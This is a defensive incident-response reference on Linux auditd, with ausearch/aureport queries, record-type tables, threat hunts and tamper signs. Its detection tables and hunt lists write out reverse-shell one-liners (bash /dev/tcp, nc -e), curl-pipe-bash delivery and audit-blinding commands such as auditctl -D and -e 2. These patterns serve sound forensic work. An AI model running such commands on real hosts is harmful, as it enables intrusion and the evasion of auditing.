# Auditd

The Linux Audit daemon is the closest thing Linux has to a high-fidelity execution log: a kernel-level record of syscalls, process executions, file access, authentication, and account changes, written to `/var/log/audit/audit.log`. When it is configured well, `ausearch` reconstructs exactly **what ran, as whom, touching which files, from which parent** — with full command-line arguments. It is the single most valuable Linux log source *when it exists*, and frequently absent or thinly configured on stock hosts.

> 🔴 **auditd only records what its rules told it to.** Absence of an event in `ausearch` is **not** absence of the activity — it may just mean no rule watched for it. Dump the ruleset (`auditctl -l`) and the daemon status (`auditctl -s`) **before** interpreting any result, and state visibility gaps explicitly in findings ("no `execve` rule was present, so process execution was not audited during the window" is a materially different statement from "no malicious execution occurred").

> ⚠️ auditd is a **rolling log** bounded by `max_log_file × num_logs`. On a busy host with stock config that can be **hours**, not days. Do the retention math (below) and **preserve the logs first** before you conclude anything from an empty search.

## Contents

- [Quick Triage](#quick-triage)
- [Where Auditd Lives](#where-auditd-lives)
- [Record Types Reference](#record-types-reference)
- [Retention and Rotation](#retention-and-rotation)
- [What to Check for What](#what-to-check-for-what)
- [Confirm Coverage First](#confirm-coverage-first)
- [Bound the Time Window](#bound-the-time-window)
- [Users and Authentication](#users-and-authentication)
- [Process Execution](#process-execution)
- [Reading a Record Field by Field](#reading-a-record-field-by-field)
- [File Activity](#file-activity)
- [Network and Containers](#network-and-containers)
- [aureport Summaries](#aureport-summaries)
- [Deep Threat Hunts](#deep-threat-hunts)
- [Getting Max Value](#getting-max-value)
- [Correlate With](#correlate-with)
- [Scenarios](#scenarios)
- [Anti-Forensics and Limitations](#anti-forensics-and-limitations)
- [Red Flags](#red-flags)
- [Resources](#resources)

---

## Quick Triage

Run in this order — coverage and preservation first, then narrow.

```bash
# 1. PRESERVE FIRST — copy the whole audit dir before it rolls (live host)
cp -a /var/log/audit /evidence/audit_$(hostname)_$(date +%F) 2>/dev/null

# 2. COVERAGE — is auditd running, and what does it even watch?
auditctl -s          # enabled? backlog? 'lost' > 0 = events were DROPPED

auditctl -l          # the ruleset = the boundary of what auditd can tell you

# 3. High-level report of the whole log (what's in here at all)
aureport --summary -i

# 4. Recent executions with full arguments (core DFIR value)
ausearch -sc execve -i -ts recent

# 5. Logins + failures
ausearch -m USER_LOGIN,USER_AUTH,USER_ACCT -i -ts recent

# 6. Sudo / privileged commands
ausearch -m USER_CMD -i

# 7. SELinux denials — often the attack being blocked
ausearch -m avc -ts recent -i

# 8. Against a MOUNTED IMAGE instead of the live host
ausearch -if /mnt/evidence/var/log/audit/audit.log -i
```

---

## Where Auditd Lives

🔴 = high-value for triage and tamper-checking. Everything an analyst needs is in two trees: `/etc/audit/` (config + rules) and `/var/log/audit/` (the evidence).

| Path | Holds | Notes |
|------|-------|-------|
| `/var/log/audit/audit.log` | 🔴 The live log (current file) | Root-only. `ausearch`/`aureport` read this by default |
| `/var/log/audit/audit.log.1 … .N` | 🔴 Rotated older logs | `ausearch`/`aureport` read these too (unless `-if` pins one file) |
| `/etc/audit/auditd.conf` | 🔴 Daemon config — retention, `log_format`, actions | Determines how far back the log goes (see Retention) |
| `/etc/audit/audit.rules` | Compiled active ruleset (generated) | Built from `rules.d/` by `augenrules` |
| `/etc/audit/rules.d/*.rules` | 🔴 Source rule fragments | What *should* be audited; compare to `auditctl -l` (what *is*) |
| `/etc/audit/plugins.d/*.conf` | Output plugins (audisp) — syslog, remote, af_unix | `au-remote.conf` = logs shipped off-box (a second copy may survive) |
| `/usr/share/audit/sample-rules/` | Vendor sample rules (CIS/STIG/PCI) | Shows what a "good" ruleset looks like for comparison |
| `/var/run/auditd.pid` | Running PID | Confirms live daemon |
| binaries: `auditctl` `ausearch` `aureport` `auditd` `augenrules` `autrace` `aulast` `aulastlog` `ausyscall` `auvirt` | The toolset | `ausyscall`/`auvirt` are underused (below) |

> 🔴 If `/etc/audit/rules.d/*.rules` is rich but `auditctl -l` is thin/empty, rules were **staged but never loaded** (or were flushed) — an attacker may have run `auditctl -D` or stopped the daemon. Compare the two.

> ℹ️ On a **mounted image**, `ausearch -if` reads one file. To search rotated history, loop the files or copy them together:
> `for f in /mnt/evidence/var/log/audit/audit.log*; do ausearch -if "$f" -i; done`

---

## Record Types Reference

Every event is one line beginning `type=... msg=audit(EPOCH:SERIAL): ...`. One logical action emits **several records sharing the same SERIAL** — reassemble them by serial (`ausearch` does this for you). Knowing the type tells you what to search for.

| Record type | What it captures | DFIR value |
|-------------|------------------|------------|
| `SYSCALL` | 🔴 The kernel action — the truth layer (syscall, success, exit, uids, pid/ppid, comm, exe, key) | The spine of every event |
| `EXECVE` | 🔴 Process execution + **every argument** (`a0 a1 a2…`) | Full command line — the smoking gun |
| `PROCTITLE` | The full (hex-encoded) command line as one string | Decodes to the readable invocation |
| `PATH` | File object(s) touched (name, inode, mode, dev) | What file the syscall hit |
| `CWD` | Working directory at time of syscall | Where the actor was operating |
| `USER_CMD` | 🔴 A user-level command run via sudo | Privileged command audit |
| `USER_LOGIN` / `LOGIN` | Login events + the assigned `auid` | Who got in, and their session identity |
| `USER_AUTH` / `USER_ACCT` | Authentication + account validity checks | Success/failure of auth |
| `USER_START` / `USER_END` | Session open/close (PAM `session`) | Session lifespan |
| `CRED_ACQ` / `CRED_REFR` / `CRED_DISP` | Credential acquire / refresh / dispose | sudo/su credential flow |
| `ADD_USER` / `ADD_GROUP` / `USER_MGMT` | 🔴 Account/group creation & management | Backdoor account creation |
| `USER_ROLE_CHANGE` / `ROLE_ASSIGN` | Privilege/role change | Privilege escalation |
| `CONFIG_CHANGE` | 🔴 An audit **rule was added/removed** | Attacker tampering with auditing |
| `DAEMON_START` / `DAEMON_END` / `DAEMON_ABORT` | 🔴 auditd started/stopped/crashed | Log-gap boundaries; anti-forensics |
| `AVC` | 🔴 SELinux allow/deny decision | Often the intrusion being blocked |
| `MAC_STATUS` / `MAC_CONFIG_CHANGE` | SELinux/AppArmor mode changed | `setenforce 0` = defenses dropped |
| `ANOM_*` (`ANOM_ABEND`, `ANOM_PROMISCUOUS`, `ANOM_EXEC`) | Anomaly events — crashes, promisc NIC, blocked exec | Exploitation / sniffing signals |
| `SOCKADDR` / `NETFILTER_PKT` | Network address of a syscall / firewall packet | Decode C2 destinations |
| `TTY` | 🔴 Keystrokes on a TTY (if `pam_tty_audit` on) | Literal typed commands |
| `SERVICE_START` / `SERVICE_STOP` | systemd service transitions | Persistence via services |

List every syscall name↔number on the box (arch-specific): `ausyscall --dump` · look one up: `ausyscall x86_64 execve`.

---

## Retention and Rotation

🔴 **Do this math before concluding "no event."** The only window auditd can answer for is `max_log_file × num_logs`.

```bash
# The two numbers that define your history
grep -E 'max_log_file|num_logs' /etc/audit/auditd.conf

# Full config
cat /etc/audit/auditd.conf

# What time range does the log ACTUALLY cover? (oldest → newest)
aureport -t

# On disk: how much history and when it last rotated
ls -la --time-style=long-iso /var/log/audit/
```

| `auditd.conf` key | Meaning | Forensic angle |
|-------------------|---------|----------------|
| `max_log_file` | MB per file before rotate | history ≈ `max_log_file × num_logs` |
| `num_logs` | How many rotated files kept | Default is small — often hours on a busy host |
| `max_log_file_action` | `ROTATE` / `KEEP_LOGS` / `SUSPEND` / `IGNORE` | 🔴 `SUSPEND`/`IGNORE` = auditing silently **stops** when full |
| `log_format` | `RAW` or `ENRICHED` | 🔴 `ENRICHED` resolves uid/gid/syscall→names **at write time** (survives offline); `RAW` needs the host's `/etc/passwd` to resolve `auid`→name during `-i` |
| `space_left_action` / `admin_space_left_action` | email / `suspend` / `halt` / `single` | Can halt logging or the box on low disk |
| `disk_full_action` / `disk_error_action` | `SUSPEND` / `HALT` / `SINGLE` / `ignore` | Explains sudden log stops |
| `flush` / `freq` | `INCREMENTAL` / `DATA` / `SYNC` | `SYNC` = most durable against crash/pull |

> 🔴 `KEEP_LOGS` (never delete) is the DFIR-friendly setting. `SUSPEND` is a trap: the log looks intact but **stopped recording** when it filled — a gap that isn't an attacker but reads like one. Confirm via `aureport -t` covering your window.

> ℹ️ **ENRICHED matters for dead-box work.** If `log_format=RAW`, an `auid=1002` only resolves to a username using *that host's* passwd DB — carry `/etc/passwd` with the logs, or resolve manually. ENRICHED bakes the names in.

---

## What to Check for What

The fast index — jump straight to the answer for the question you're actually asking.

| Investigative question | Command / filter |
|------------------------|------------------|
| Did coverage even exist during my window? | `auditctl -l`, `auditctl -s` (check `lost`), `aureport -t` |
| What ran, with what arguments? | `ausearch -sc execve -i` / `ausearch -m EXECVE,PROCTITLE -i` |
| Who *really* ran it (login identity)? | `ausearch -ua <user>` / `-ua 0`; read the `auid` field |
| Was it privileged (sudo)? | `ausearch -m USER_CMD -i` |
| Who logged in / failed to? | `ausearch -m USER_LOGIN -sv no -i` (fail) / `-sv yes` |
| Was a sensitive file read/written? | `ausearch -f /etc/shadow -i` (needs a `-w` watch) |
| Were logs or tools deleted? | `ausearch -sc unlink -sc unlinkat -i` |
| Any outbound connections? | `ausearch -sc connect -i` |
| Account created / modified? | `ausearch -m ADD_USER,USER_MGMT,ADD_GROUP -i` or `aureport -m` |
| SELinux denials (blocked attack)? | `ausearch -m avc -i` |
| Audit rules or config tampered? | `ausearch -m CONFIG_CHANGE -i`; `aureport -c` |
| Was auditing stopped/started (gap)? | `ausearch -m DAEMON_START,DAEMON_END,DAEMON_ABORT -i` |
| Everything a PID did? | `ausearch -p <pid> -i` (child of: `-pp <ppid>`) |
| Everything in one login session? | `ausearch --session <ses> -i` |
| Everything a rule keyed? | `ausearch -k <key> -i` |

---

## Confirm Coverage First

🔴 The ruleset and daemon status are your ground truth. Establish them before drawing any conclusion from a search.

```bash
# Is auditd running?
systemctl status auditd

# Runtime status — the numbers that matter
auditctl -s
#   enabled 0=off 1=on 2=IMMUTABLE(locked until reboot)
#   lost N   -> N events were DROPPED (backlog too small) = a real blind spot
#   backlog / backlog_wait_time -> pressure indicators
#   failure 0=silent 1=printk 2=PANIC on audit failure

# The active ruleset (interpretation depends ENTIRELY on this)
auditctl -l

# Source rules that SHOULD be loaded — diff against auditctl -l
cat /etc/audit/rules.d/*.rules

# Are events being enriched with names? (affects offline resolution)
grep log_format /etc/audit/auditd.conf
```

| Signal | Meaning |
|--------|---------|
| `auditctl -l` → `No rules` | 🔴 Only auth/login/anom auto-events captured — **no execution or file visibility** |
| `enabled 2` (immutable) then a log gap | 🔴 Attacker locked the config after tampering (can't be changed till reboot) |
| `lost` > 0 in `auditctl -s` | 🔴 Events dropped — increase `backlog_limit`; treat gaps as *unknown*, not *clean* |
| `rules.d` rich but `auditctl -l` empty | 🔴 Rules flushed (`auditctl -D`) or daemon restarted without load |
| `failure 2` | Host is set to panic on audit loss — unusual, high-security build |

> If the ruleset is thin, write the gap into your notes verbatim. "Process execution was not audited during 04/23 10:00–18:00" is a finding, not a non-finding.

---

## Bound the Time Window

auditd stores timestamps as **epoch**; `ausearch` date syntax is **US-style `mm/dd/yyyy`**. Bound the window once you trust the ruleset.

```bash
# Absolute window (m/d/Y HH:MM:SS that ausearch expects)
ausearch -if /mnt/evidence/var/log/audit/audit.log \
  -ts 04/23/2026 10:00:00 -te 04/23/2026 18:00:00 -i

# Relative shortcuts
ausearch -ts recent -i        # last 10 minutes

ausearch -ts today -i

ausearch -ts yesterday -te today -i

ausearch -ts this-week -i

# Convert an epoch stamp <-> human (audit uses epoch internally)
date -d @1679084718

echo 1678912521 | xargs -I{} date -d @{}
```

> ℹ️ `-ts`/`-te` accept `recent`, `today`, `yesterday`, `this-week`, `this-month`, `checkpoint`, or `mm/dd/yyyy HH:MM:SS`. Always confirm the *host* timezone before correlating with UTC sources.

---

## Users and Authentication

```bash
# All login-related activity
ausearch -m USER_LOGIN,USER_AUTH,USER_ACCT,LOGIN -i -ts recent

# Successful vs failed logins
ausearch -m USER_LOGIN -sv yes -i

ausearch -m USER_LOGIN -sv no -i

# By login user, or by root's login session (uid 0)
ausearch -ua <username> -i

ausearch -ua 0 -i

# Account creation / group changes / privilege changes (backdoor accounts)
ausearch -m ADD_USER,ADD_GROUP,USER_MGMT,USER_ROLE_CHANGE -i

# Credential flow (su/sudo)
ausearch -m CRED_ACQ,CRED_REFR,CRED_DISP -i
```

The `-ua` (audit login UID / `auid`) filter is the power move: it follows the **original logged-in user across `su`/`sudo`**. `ausearch -ua 0` is not "things done as root" — it is "things done in **root's login session**," usually a smaller, more relevant set.

| Signal | Meaning |
|--------|---------|
| Burst of `USER_LOGIN -sv no` from one source | 🔴 Brute force — pivot to `/var/log/auth.log` / journal |
| `USER_LOGIN` success right after a fail burst | 🔴 Successful guess — mark that account compromised |
| `ADD_USER` / `USER_MGMT` off-hours | 🔴 Backdoor account — cross-check `/etc/passwd`, `/etc/shadow` |
| `auid=4294967295` (unset/-1) on interactive-looking activity | Process not spawned from a login (daemon, or `auid` never set) — see field decode |
| `USER_ROLE_CHANGE` to admin/wheel | Privilege escalation |

---

## Process Execution

auditd's core DFIR value. One command produces a **chain of records sharing a serial**; reassembling them reconstructs the full invocation.

The chain for one command: **`USER_CMD` → `SYSCALL` → `EXECVE` → `PATH`/`CWD` → `PROCTITLE`**.

```bash
# All executions (with resolved names)
ausearch -sc execve -i

# Today's executions only
ausearch -ts today -m EXECVE -i

# A specific command by name / by executable path
ausearch -c "curl" -i

ausearch -x /usr/bin/wget -i

# The archiver example from RTR (staging/exfil)
ausearch -c "7za" -i

# Sudo activity
ausearch -c sudo -i

# User-level commands (via sudo)
ausearch -m USER_CMD -i

# SUID / privilege-abuse pattern (RTR)
ausearch -m EXECVE -i | grep -i suid

# Download / staging / encoding tooling in one sweep
ausearch -c curl -c wget -c base64 -c nc -c python -c bash -i

# Everything a PID (and its children) did
ausearch -p <pid> -i

ausearch -pp <ppid> -i
```

🔴 A cluster of `EXECVE` records for download/staging tools (`curl`, `wget`, `base64`, `nc`, `python`) from an unexpected path or user is the **execution phase of an intrusion caught in high fidelity** — auditd records the arguments, so you recover the full download URL, the decoded payload, or the reverse-shell one-liner verbatim.

| Signal in `EXECVE` args | Meaning |
|-------------------------|---------|
| `curl … | bash` / `wget -O- … | sh` | 🔴 Curl-pipe-bash payload delivery |
| `base64 -d`, `xxd -r`, `openssl enc -d` | 🔴 In-line payload decoding — decode the arg to see the real command |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | 🔴 Reverse shell (the classic) |
| `python -c 'import socket…'` / `nc -e` | 🔴 Reverse shell / bind shell |
| `chmod +x` on a `/tmp` or `/dev/shm` file | 🔴 Dropped-payload staging |
| `exe=` in `/tmp`, `/dev/shm`, `/var/tmp`, `memfd:` | 🔴 Execution from a scratch/memory location |

---

## Reading a Record Field by Field

The user's most common ask: "what does this line actually mean?" A `SYSCALL` record's fields:

```
type=SYSCALL … arch=c000003e syscall=59 success=yes exit=0
  a0=… a1=… a2=… ppid=1234 pid=1300 auid=1002 uid=1002 gid=1002
  euid=0 suid=0 fsuid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" key="exec"
```

| Field | Meaning | Why it matters |
|-------|---------|----------------|
| `syscall=59` | Syscall number (59 = `execve` on x86_64) | Resolve with `ausyscall x86_64 59`; `-i` names it for you |
| `success` / `exit` | Did it work + return code | `success=no` = attempted-but-blocked (still evidence) |
| `auid` | 🔴 **Login UID** — the original human, immutable | `auid=0` = did it in root's login; `4294967295`/`-1` = no login (daemon) |
| `uid` / `euid` | Real / effective user now | `uid=1002 euid=0` = privilege was gained (sudo/SUID) |
| `ppid` / `pid` | Parent / this process | Rebuild the tree; odd parent (`nginx`→`bash`) = webshell |
| `comm` | Command name (**truncated to 16 chars**) | Quick label; trust `exe` for the real path |
| `exe` | 🔴 Full path of the binary | `/tmp`, `/dev/shm`, `memfd:`, `(deleted)` = red flags |
| `tty` / `ses` | Terminal / session id | `ses` groups a whole login session (`ausearch --session`) |
| `key` | The `-k` tag from the matching rule | Fast pivot: `ausearch -k <key>` |

> `comm` is 16 chars max — malware named `kworker/0:2-eventsxyz` truncates to look like a kernel thread. **Always read `exe`, not just `comm`.**

Decode hex-encoded arguments / `PROCTITLE` (encoded when they contain spaces/quotes/control chars):

```bash
# Hex PROCTITLE -> readable command line
echo "63686D6F64002B78007370726561642E7368" | xxd -r -p | tr '\0' ' '
#   -> chmod +x spread.sh

# -i interprets most fields already — use it everywhere
ausearch -k mykey -i -ts recent
```

---

## File Activity

File-access auditing only fires where a **watch rule (`-w`) exists**, so this section depends on the ruleset. Where watches are in place it is excellent for credential theft and anti-forensic deletion.

```bash
# Access to a watched path
ausearch -f /tmp -i

# Sensitive credential files (need a -w watch to have been set)
ausearch -f /etc/passwd -i

ausearch -f /etc/shadow -i

# Deletions (anti-forensics / log wiping)
ausearch -sc unlink -sc unlinkat -sc rename -sc renameat -i

# Opens / modifications
ausearch -sc open -sc openat -sc truncate -i

# Permission / ownership changes (SUID planting)
ausearch -sc chmod -sc fchmod -sc chown -sc fchown -i
```

Add a watch on a live host (defensive — not needed to read existing logs), then query by its key:

```bash
auditctl -w /etc/shadow -p rwa -k shadow_watch

ausearch -k shadow_watch -i
```

| Signal | Meaning |
|--------|---------|
| `open`/`read` of `/etc/shadow` by a non-admin process | 🔴 Credential theft |
| `unlink`/`unlinkat` of `/var/log/*` or the audit log | 🔴 Anti-forensics / log wiping |
| `chmod` adding SUID (`4000`) to a dropped binary | 🔴 Privilege-escalation persistence |
| `rename` of a system binary (`/usr/bin/ssh` → backup) | 🔴 Trojaned-binary swap |

---

## Network and Containers

```bash
# Outbound connect() syscalls, pivot on a suspect IP
ausearch -sc connect -i | grep "10.0.0.5"

# Decode the destination address of a connect (SOCKADDR record)
ausearch -sc connect -i | grep -A1 SOCKADDR

# Docker / container activity (if a -k docker rule exists)
ausearch -k docker -i

ausearch -i | grep -i container

# Promiscuous-mode NIC (sniffer enabled) — auto-logged as ANOM_PROMISCUOUS
ausearch -m ANOM_PROMISCUOUS -i
```

auditd sees container syscalls too — containers are just host processes. Correlate the recorded **host PID with its cgroup** to attribute a syscall to a specific container (→ Container notes).

| Signal | Meaning |
|--------|---------|
| `connect` to an external IP from a service account | 🔴 C2 / exfil — decode `SOCKADDR`, pivot to PCAP/journal |
| `ANOM_PROMISCUOUS` | 🔴 Interface put in promiscuous mode — packet sniffer |
| container `exec` into a running container from odd parent | 🔴 Lateral movement / hands-on-keyboard |

---

## aureport Summaries

`aureport` turns the raw log into ranked summaries — the fastest way to see *shape* before you drill with `ausearch`. Add `-i` (interpret), `--failed`/`--success`, and `-ts/-te` to any of these.

```bash
aureport --summary -i            # top-level overview of everything

aureport -au -i                  # authentication attempts

aureport -l -i                   # logins (who/when/where/result)

aureport -u -i                   # user activity summary

aureport -x -i                   # executables run (ranked)

aureport -x --summary -i         # exec counts per binary

aureport -f -i                   # files accessed (watched)

aureport -s -i                   # syscalls

aureport -p -i                   # processes seen

aureport -m -i                   # account modifications (add/mod user/group)

aureport -c -i                   # config changes (incl. audit rule changes)

aureport -k -i                   # events grouped by rule key

aureport --tty -i                # captured TTY keystrokes (if pam_tty_audit)

aureport -t                      # time range the log covers

aureport --failed -i             # ONLY failed events across the board
```

🔴 `aureport --failed -i` and `aureport -au --failed -i` surface blocked/denied activity fast — failures are where probing, brute force, and privilege attempts show up.

---

## Deep Threat Hunts

Higher-order hunts beyond single-record lookups. *(commands + ideas — additive, DFIR practice)*

```bash
# 1. Execution from scratch/memory dirs — top fileless/staging tell
ausearch -sc execve -i | grep -E 'exe="(/tmp|/var/tmp|/dev/shm|/run|memfd:)'

# 2. Anything whose exe was deleted while running (defunct/fileless)
ausearch -sc execve -i | grep -i 'deleted'

# 3. Privilege gained: real uid != 0 but euid == 0 in a SYSCALL
ausearch -m SYSCALL -i | grep -E 'uid=[^0].* euid=0'

# 4. Interpreter spawned by a web/service user (webshell pattern)
ausearch -sc execve -i | grep -E 'auid=(www-data|apache|nginx|33|48)' \
  | grep -E 'comm="(bash|sh|python|perl|nc|curl|wget)"'

# 5. Audit tampering: rules changed, then a quiet period
ausearch -m CONFIG_CHANGE,DAEMON_START,DAEMON_END,DAEMON_ABORT -i

# 6. New cron / systemd / ssh-key writes (persistence via file watches)
ausearch -k cron -k systemd -k ssh -i          # if such keys exist

# 7. Every distinct external destination contacted
ausearch -sc connect -i | grep -oE 'laddr=[0-9.]+|addr=[0-9.]+' | sort -u

# 8. Rank the noisiest keys/executables to spot the anomaly
aureport -k -i --summary

aureport -x -i --summary | sort -k1 -n
```

**Hunt ideas (turn into rules/queries for the case):**

- **Baseline then diff.** Pull `aureport -x --summary` from a known-good peer host; anything on the suspect host that isn't on the peer is a lead.
- **Off-hours execution.** Bound `ausearch -sc execve` to nights/weekends — interactive tooling then is high-signal.
- **Parent/child anomalies.** Web/DB/mail service `auid` spawning shells or network tools = code execution through the app (→ Web Exploitation playbook).
- **Argument content, not just names.** Grep decoded `EXECVE` args for `http`, `base64`, `/dev/tcp`, `chmod +x`, `crontab`, `authorized_keys`.
- **auid pivot.** Take the compromised account's `auid`, run `ausearch -ua <n> -i` for its *entire* footprint across the log.
- **Session reconstruction.** From one bad event grab `ses=`, then `ausearch --session <ses> -i` to replay the whole login end-to-end.

---

## Getting Max Value

Squeeze more out of auditd during and after an engagement:

- **Add targeted watches live** (non-destructive): key files and dirs so subsequent activity is captured with a searchable key.
  ```bash
  auditctl -w /etc/passwd -p wa -k passwd_watch

  auditctl -w /root/.ssh -p rwa -k ssh_watch

  auditctl -a always,exit -F arch=b64 -S execve -k exec_hunt
  ```
- **Use keys as fast lanes.** Every rule should carry `-k <name>`; then `ausearch -k` / `aureport -k` jump straight to those events.
- **Deploy a known-good ruleset** for ongoing IR (Neo23x0/auditd, CIS, or STIG samples in `/usr/share/audit/sample-rules/`) — dramatically widens execution/file coverage.
- **Export for the timeline / SIEM:**
  ```bash
  ausearch -sc execve -ts today --format csv > execve_today.csv   # newer audit

  ausearch --format text -ts today                                # sentence-form summaries
  ```
- **`aureport` first, `ausearch` second.** Report to find *shape*, search to pull the *evidence*.
- **Ship a second copy off-box.** If `plugins.d/au-remote.conf` is active, the remote collector may hold logs an attacker wiped locally — check it.
- **`aulast` / `aulastlog`** reconstruct login history from the audit log (an auditd-native alternative when `wtmp`/`btmp` are wiped).

---

## Correlate With

auditd is rarely read alone — pivot to confirm and expand.

| To answer… | Pivot to |
|------------|----------|
| Fill exec gaps auditd missed / service context | **Systemd Journal**, **Sysmon for Linux** |
| Full login picture (`wtmp`/`btmp`/`lastlog`) | **Authentication and Login Records** |
| Reconstruct the process tree around a bad PID | **Process Trees and Execution Lineage** (10b) |
| What persistence the execution installed | **Persistence Mechanisms** (cron, systemd, ssh-keys, PAM) |
| Meaning of `AVC` denials / MAC changes | **SELinux AppArmor and Kernel Hardening** (05) |
| Decode/confirm C2 destinations from `connect` | **Network and PCAP Forensics** (10c) |
| Live view of a still-running culprit | **Live Response and Volatile Data** (10) |
| Attribute a container syscall to its container | **Container** notes (host PID ↔ cgroup) |

---

## Scenarios

When auditd earns its keep:

- **Webshell / RCE:** service account (`www-data`) `EXECVE` of `bash`/`python` with a bad parent — proves code execution through the app and captures the exact command.
- **Reverse shell:** the `bash -i >& /dev/tcp/…` or `python -c` one-liner recorded verbatim in `EXECVE` args.
- **Credential theft:** `open`/`read` of `/etc/shadow` or `~/.ssh/id_*` by a non-admin process (with the right watch).
- **Privilege escalation:** `USER_CMD`/sudo from an unexpected account, or a `SYSCALL` where `uid≠0` but `euid=0`.
- **Backdoor account:** `ADD_USER`/`USER_MGMT` off-hours creating a persistence account.
- **Anti-forensics:** `CONFIG_CHANGE`/`DAEMON_END` marking where the attacker blinded auditing, or `unlink` of logs.
- **Attribution across sudo:** `-ua` ties every action back to the original human even after `su root`.

---

## Anti-Forensics and Limitations

| Limitation / tamper technique | Implication / how to detect |
|-------------------------------|-----------------------------|
| 🔴 **Ruleset defines reality** | No rule = no record. Always dump `auditctl -l`; state gaps |
| 🔴 `auditctl -D` (flush rules) | Rules vanish silently — `rules.d` will still show what *should* be there |
| 🔴 `service auditd stop` / kill | Gap in the log — bounded by `DAEMON_END` … `DAEMON_START` |
| 🔴 `auditctl -e 2` (immutable) after tampering | Config locked until reboot — attacker's changes stick |
| 🔴 Log deletion / truncation | `unlink`/`>` on `audit.log` — check mtimes vs `aureport -t`; a remote copy may survive |
| `max_log_file_action=SUSPEND` fills up | Auditing **stops** silently — looks like a gap, isn't an attacker |
| `lost` > 0 (backlog overflow) | Events dropped under load — a real blind spot, not "clean" |
| `comm` truncated to 16 chars | Masquerade as kernel threads — read `exe`, not `comm` |
| `log_format=RAW` on a dead box | `auid`/uid won't resolve to names without the host's `/etc/passwd` |

> 🔴 The tamper signature to hunt: `DAEMON_END` or `CONFIG_CHANGE` (rules removed), followed by a period with **no execution records**, followed by activity resuming. That silence is the attacker working blind — treat it as *unknown*, and lean on journald/EDR/network logs for the gap.

---

## Red Flags

| 🔴 Finding | Likely meaning |
|-----------|----------------|
| No auditd / empty ruleset / `lost` > 0 | Major execution-visibility gap — state it explicitly |
| `EXECVE` of `curl`/`wget`/`base64`/`nc` from odd paths | Payload retrieval / staging |
| `exe=` in `/tmp`, `/dev/shm`, `memfd:`, or `(deleted)` | Fileless / scratch-dir execution |
| `EXECVE` args containing `/dev/tcp/…` or `nc -e` | Reverse / bind shell |
| `USER_CMD`/sudo from an unexpected account | Privilege escalation |
| `SYSCALL` with `uid≠0` and `euid=0` | Privilege gained (SUID/sudo) |
| Service `auid` (`www-data`/`nginx`) spawning a shell | Webshell / RCE through the app |
| `unlink`/`unlinkat` of logs or tools | Anti-forensics cleanup |
| `avc` denials clustering around a service | SELinux catching the intrusion |
| Access to `/etc/shadow` by a non-admin process | Credential theft |
| `ADD_USER`/`USER_MGMT` off-hours | Backdoor account |
| `CONFIG_CHANGE` → quiet period → activity | Attacker blinded auditing, then worked |
| `auditctl -e 2` set, then a gap | Config locked after tampering |
| `ANOM_PROMISCUOUS` | Packet sniffer enabled on an interface |

---

## Resources

- `auditd(8)`, `auditctl(8)`, `ausearch(8)`, `aureport(8)`, `auditd.conf(5)`, `audit.rules(7)` — the Linux Audit project man pages
- `ausyscall`, `autrace`, `aulast`, `aulastlog`, `auvirt` — companion tools
- Linux Audit project: https://github.com/linux-audit/audit-userspace
- Sample/hardened rulesets: `/usr/share/audit/sample-rules/`; Neo23x0/auditd best-practice rules
- MITRE ATT&CK: T1059 (Command & Scripting), T1136 (Create Account), T1070 (Indicator Removal), T1562.001 (Impair Defenses), T1548 (Abuse Elevation Control)
